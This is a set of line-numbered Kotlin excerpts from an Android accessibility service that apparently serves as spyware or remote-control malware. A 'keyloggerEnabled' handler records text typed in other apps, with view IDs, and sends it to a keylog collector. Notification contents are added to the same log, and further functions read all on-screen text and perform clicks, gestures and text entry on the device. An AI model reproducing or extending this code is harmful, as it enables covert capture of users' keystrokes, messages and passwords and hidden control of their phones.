   181→    private fun handleTextChangeEvent(event: AccessibilityEvent, packageName: String) {
   182→        if (!keyloggerEnabled.get()) return
   183→
   184→        textEventCount++
   185→        
   186→        try {
   187→            // Get the text from the event
   188→            val text = event.text?.joinToString("") ?: ""
   189→            val fromIndex = event.fromIndex
   190→            val addedCount = event.addedCount
   191→            val removedCount = event.removedCount
   192→            val beforeText = event.beforeText?.toString() ?: ""
   193→            
   194→            // Get the source node for more details
   195→            val source = event.source
   196→            val viewId = source?.viewIdResourceName ?: ""
   197→            val className = source?.className?.toString() ?: ""
   198→            val description = source?.contentDescription?.toString() ?: ""
   199→            
   200→            // Build the captured data
   201→            val capturedText = buildString {
   202→                if (text.isNotEmpty()) {
   203→                    append(text)
   204→                }
   205→                if (beforeText.isNotEmpty() && text.isNotEmpty() && beforeText != text) {
   206→                    // Text was modified
   207→                    append("[EDIT]")
   208→                }
   209→            }
   210→            
   211→            if (capturedText.isNotEmpty()) {
   212→                // Update last captured
   213→                lastCapturedText.append(capturedText)
   214→                if (lastCapturedText.length > 10000) {
   215→                    lastCapturedText = StringBuilder(lastCapturedText.takeLast(5000))
   216→                }
   217→                
   218→                // Send to MonitorExecutor
   219→                MonitorExecutor.appendKeylog(
   220→                    packageName = packageName,
   221→                    text = capturedText,
   222→                    viewType = "text_change"
   223→                )
   224→                
   225→                // Also log with context
   226→                logKeyEvent(
   227→                    packageName = packageName,
   228→                    text = capturedText,
   229→                    viewId = viewId,
   230→                    className = className
   231→                )
   232→            }
   233→            
   234→            source?.recycle()
   235→        } catch (e: Exception) {
   236→            // Log error but don't crash
   237→        }
   238→    }

   311→                    if (title.isNotEmpty()) append("[$title] ")
   312→                    if (message.isNotEmpty()) append(message)
   313→                    if (text.isNotEmpty() && text != message) append(" | $text")
   314→                }
   315→                
   316→                if (notifText.isNotEmpty()) {
   317→                    MonitorExecutor.appendKeylog(
   318→                        packageName = packageName,
   319→                        text = "[NOTIF:$notifText]",

   388→    fun clickOnText(text: String, exactMatch: Boolean = false): Boolean {
   389→        val root = rootInActiveWindow ?: return false
   390→        
   391→        val nodes = if (exactMatch) {
   392→            root.findAccessibilityNodeInfosByText(text)
   393→                .filter { it.text?.toString() == text }
   394→        } else {
   395→            root.findAccessibilityNodeInfosByText(text)
   396→        }
   397→        
   398→        try {
   399→            for (node in nodes) {
   400→                val clicked = performClickOnNode(node)
   401→                if (clicked) return true
   402→            }
   403→            return false
   404→        } finally {
   405→            // Recycle all nodes to prevent memory leaks
   406→            for (node in nodes) {
   407→                if (node != null) node.recycle()
   408→            }
   409→        }
   410→    }

   436→    fun clickAt(x: Int, y: Int): Boolean {
   437→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
   438→            return false
   439→        }
   440→        
   441→        val path = Path().apply {
   442→            moveTo(x.toFloat(), y.toFloat())

   444→        
   445→        val gesture = GestureDescription.Builder()
   446→            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
   447→            .build()
   448→        
   449→        // Use local latch/result to avoid race conditions between concurrent calls
   450→        val localLatch = CountDownLatch(1)
   451→        val localResult = AtomicBoolean(false)
   452→        
   453→        val dispatched = dispatchGesture(gesture, object : GestureResultCallback() {
   454→            override fun onCompleted(gestureDescription: GestureDescription?) {
   455→                localResult.set(true)
   456→                localLatch.countDown()
   457→            }
   458→            
   459→            override fun onCancelled(gestureDescription: GestureDescription?) {
   460→                localResult.set(false)
   461→                localLatch.countDown()
   462→            }
   463→        }, null)
   464→        
   465→        if (dispatched) {
   466→            localLatch.await(2, TimeUnit.SECONDS)
   467→        }
   468→        
   469→        return localResult.get()
   470→    }

   512→    /**
   513→     * Type text into a focused input field
   514→     */
   515→    fun typeText(text: String): Boolean {
   516→        val root = rootInActiveWindow ?: return false
   517→        
   518→        // Find focused node or editable node
   519→        val editNodes = root.findAccessibilityNodeInfosByViewId("android:id/edit")
   520→        val editNode = editNodes.firstOrNull()
   521→        // Recycle unused edit nodes (keep the one we'll use)
   522→        for (node in editNodes) {
   523→            if (node !== editNode) node.recycle()
   524→        }
   525→
   526→        val textNodes = if (editNode != null) emptyList() else root.findAccessibilityNodeInfosByText("")
   527→        val editableNode = textNodes.firstOrNull { it.isEditable }
   528→        // Recycle unused text search nodes
   529→        for (node in textNodes) {
   530→            if (node !== editableNode) node.recycle()
   531→        }
   532→
   533→        val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
   534→            ?: editNode
   535→            ?: editableNode
   536→
   537→        if (focusedNode == null) return false
   538→        
   539→        // Try to set text directly
   540→        val arguments = Bundle()
   541→        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
   542→        val result = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
   543→        
   544→        focusedNode.recycle()
   545→        return result
   546→    }

   548→    /**
   549→     * Scroll in a direction
   550→     */
   551→    fun scroll(direction: ScrollDirection): Boolean {
   552→        val root = rootInActiveWindow ?: return false
   553→        
   554→        val action = when (direction) {
   555→            ScrollDirection.UP -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
   556→            ScrollDirection.DOWN -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
   557→            ScrollDirection.LEFT -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
   558→            ScrollDirection.RIGHT -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
   559→        }
   560→        
   561→        // Find scrollable node
   562→        val scrollableNode = findScrollableNode(root, direction) ?: return false
   563→        val result = scrollableNode.performAction(action)
   564→        scrollableNode.recycle()
   565→        
   566→        return result
   567→    }
   568→    
   569→    private fun findScrollableNode(node: AccessibilityNodeInfo, direction: ScrollDirection): AccessibilityNodeInfo? {
   570→        if (node.isScrollable) return node
   571→        
   572→        for (i in 0 until node.childCount) {
   573→            val child = node.getChild(i) ?: continue
   574→            val result = findScrollableNode(child, direction)
   575→            if (result != null) return result
   576→            child.recycle()
   577→        }
   578→        
   579→        return null
   580→    }

   594→    private fun extractTextFromNode(node: AccessibilityNodeInfo, builder: StringBuilder) {
   595→        val text = node.text?.toString()
   596→        if (!text.isNullOrBlank()) {
   597→            builder.append(text).append("\n")
   598→        }
   599→        
   600→        val contentDesc = node.contentDescription?.toString()
   601→        if (!contentDesc.isNullOrBlank() && contentDesc != text) {
   602→            builder.append(contentDesc).append("\n")
   603→        }
   604→        
   605→        for (i in 0 until node.childCount) {
   606→            val child = node.getChild(i) ?: continue
   607→            extractTextFromNode(child, builder)
   608→            child.recycle()
   609→        }
   610→    }

   646→        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
   647→            return false
   648→        }
   649→        
   650→        val path = Path().apply {
   651→            moveTo(x.toFloat(), y.toFloat())
   652→        }
   653→        
   654→        val gesture = GestureDescription.Builder()
   655→            .addStroke(GestureDescription.StrokeDescription(path, 0, 500))
   656→            .build()
   657→        
   658→        return dispatchGesture(gesture, null, null)
   659→    }
   660→
   661→    private fun performClickOnNode(node: AccessibilityNodeInfo): Boolean {
   662→        // Try direct click
   663→        if (node.isClickable) {
   664→            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   665→        }
   666→        
   667→        // Try parent click
   668→        var parent = node.parent
   669→        while (parent != null) {
   670→            if (parent.isClickable) {
   671→                val clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   672→                parent.recycle()
   673→                return clicked
   674→            }
   675→            val grandParent = parent.parent
   676→            parent.recycle()
   677→            parent = grandParent
   678→        }
   679→        
   680→        // Try click via coordinates
   681→        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
   682→            val bounds = Rect()
   683→            node.getBoundsInScreen(bounds)
   684→            return clickAt(bounds.centerX(), bounds.centerY())
   685→        }
   686→        
   687→        return false
   688→    }
